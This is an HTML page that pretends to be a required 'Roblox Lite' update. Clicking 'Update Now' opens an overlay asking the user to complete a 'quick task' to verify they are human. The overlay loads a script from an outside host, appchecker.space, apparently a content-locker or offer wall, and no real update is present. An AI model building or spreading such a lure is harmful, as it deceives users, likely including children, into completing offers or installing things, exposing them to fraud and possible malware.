<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Roblox Lite Update</title>

<style>

/* 🔥 SCROLL LOCK */
html, body{
margin:0;
padding:0;
height:100%;
overflow:hidden;
font-family:sans-serif;
background:#ffffff;
}

/* ================= SCREEN ================= */

.update-screen{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
}

/* CARD */
.box{
width:90%;
max-width:360px;
padding:25px;
border-radius:22px;
text-align:center;
background:#fff;
box-shadow:0 15px 40px rgba(0,0,0,0.1);
animation:pop 0.3s ease;
}

/* LOGO */
.logo{
width:120px;
margin-bottom:15px;
}

/* TITLE */
.title{
font-size:20px;
font-weight:700;
margin-bottom:10px;
color:#111;
}

/* DESC */
.desc{
font-size:14px;
color:#666;
margin-bottom:20px;
line-height:1.5;
}

/* BUTTON */
.btn{
width:100%;
padding:12px;
border:none;
border-radius:12px;
background:linear-gradient(135deg,#6a00ff,#ff2e92);
color:#fff;
font-weight:bold;
font-size:14px;
cursor:pointer;
box-shadow:0 6px 18px rgba(255,46,146,0.4);
}

.btn:active{
transform:scale(0.96);
}

/* ================= CAPTCHA OVERLAY ================= */

#captchaOverlay{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.65);
display:none;
justify-content:center;
align-items:center;
z-index:9999;
}

.overlay-box{
width:90%;
max-width:380px;
padding:18px;
border-radius:22px;
text-align:center;
background:linear-gradient(135deg,#6a00ff,#ff2e92);
box-shadow:0 15px 40px rgba(0,0,0,0.5);
animation:pop 0.3s ease;
}

.overlay-box img{
width:100%;
border-radius:15px;
margin-bottom:15px;
}

.overlay-box p{
color:#fff;
font-size:14px;
font-weight:600;
margin-bottom:15px;
}

/* CAPTCHA */
#captchaWrapper{
background:#fff;
padding:10px;
border-radius:12px;
display:none;
}

/* ANIMATION */
@keyframes pop{
from{
transform:scale(0.8);
opacity:0;
}
to{
transform:scale(1);
opacity:1;
}
}

</style>
</head>

<body>

<!-- 🔥 WHITE SCREEN -->
<div class="update-screen">

<div class="box">

<img class="logo" src="https://i.postimg.cc/SxZpCrqV/IMG-20260316-050847.jpg">

<div class="title">Update Required</div>

<div class="desc">
Please update to the latest version of Roblox Lite to continue using the app smoothly.
</div>

<button class="btn" onclick="openCaptcha()">Update Now</button>

</div>

</div>

<!-- 🔥 CAPTCHA OVERLAY -->
<div id="captchaOverlay">
<div class="overlay-box">

<img src="https://i.postimg.cc/SxZpCrqV/IMG-20260316-050847.jpg">

<p>
Complete ONE quick task below to verify you're HUMAN and your game will updated automatically.
</p>

<div id="captchaWrapper">
<script src="https://appchecker.space/cp/js/n02p8" defer></script>
<div data-captcha-enable="true"></div>
</div>

</div>
</div>

<script>

function openCaptcha(){

document.getElementById("captchaOverlay").style.display="flex";

setTimeout(()=>{
document.getElementById("captchaWrapper").style.display="block";
},1000);

}

</script>

</body>
</html>
